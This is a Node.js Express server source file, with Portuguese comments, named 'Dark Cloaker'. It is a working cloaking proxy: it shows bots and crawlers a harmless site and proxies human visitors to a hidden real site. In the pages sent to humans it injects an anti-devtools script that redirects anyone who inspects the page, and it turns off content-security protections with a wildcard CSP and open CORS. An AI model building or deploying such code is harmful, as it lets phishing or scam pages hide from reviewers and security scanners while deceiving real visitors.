require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const axios = require("axios");
const { isBot } = require("./utils/botDetection");
const { mutateHTMLSafe } = require("./utils/mutator");
const Domain = require("./models/Domain");

const app = express();
const path = require("path");

// 🛡 Segurança digital
app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🗂 Serve arquivos estáticos locais (sem CORS, sem proxy)
app.use("/assets", express.static(path.join(__dirname, "public", "assets")));

// 🔗 Rotas de API
app.use("/api/auth", require("./routes/auth.routes"));
app.use("/api/domain", require("./routes/domain.routes"));

// 🔌 Conexão com MongoDB
(async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("🔥 MongoDB conectado");
  } catch (err) {
    console.error("❌ Erro MongoDB:", err.message);
    process.exit(1);
  }
})();

// 🎭 Middleware universal de cloaking + injeção
app.use(async (req, res, next) => {
  try {
    const host = req.hostname;
    const ua = req.headers["user-agent"] || "";
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const urlPath = req.originalUrl;

    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    const isBotVisit = isBot(ua, ip);
    const targetUrl = isBotVisit ? domain.baseUrl : domain.realUrl;
    const fullUrl = `${targetUrl}${urlPath}`;

    // 🔎 Detecta se é asset (mas agora servimos local!)
    const isAsset = /\.(js|css|png|jpe?g|gif|svg|woff2?|ttf|eot|ico|json|txt|webp|mp4|map)(\?.*)?$/.test(urlPath);
    if (isAsset) return next(); // deixa o express.static cuidar

    // 📡 Requisição do HTML do site real (para humano)
    const headers = {
      "User-Agent": ua,
      "X-Forwarded-For": ip,
      Referer: req.get("referer") || "",
    };

    const response = await axios.get(fullUrl, { headers });
    let html = response.data;

    // 🛡 Anti-clonagem e anti-devtools
    const antiDebug = `
      <script>
        function devtoolsDetector() {
          const s = performance.now(); debugger; const e = performance.now();
          if (e - s > 100) window.location.href = '${domain.fallbackUrl}';
        }
        setInterval(devtoolsDetector, 2000);
      </script>
    `;

    // 🧬 Mutação: caminhos + CSP + injeções
    html = mutateHTMLSafe(html);

    
    // Corrige só se NÃO começar com /assets/
    // Corrige apenas caminhos que não começam com / ou http
    html = html.replace(/(src|href)=["'](?!https?:\/\/|\/)(\.?\/)?assets\//g, `$1="/assets/`);


    html = html.replace("</body>", `${antiDebug}</body>`);

    // Cabeçalhos finais
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:");

    return res.send(html);

  } catch (err) {
    console.error("❌ Erro proxy blindado:", err.message);
    return res.redirect("https://google.com");
  }
});

// 🚀 Start do servidor
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
});
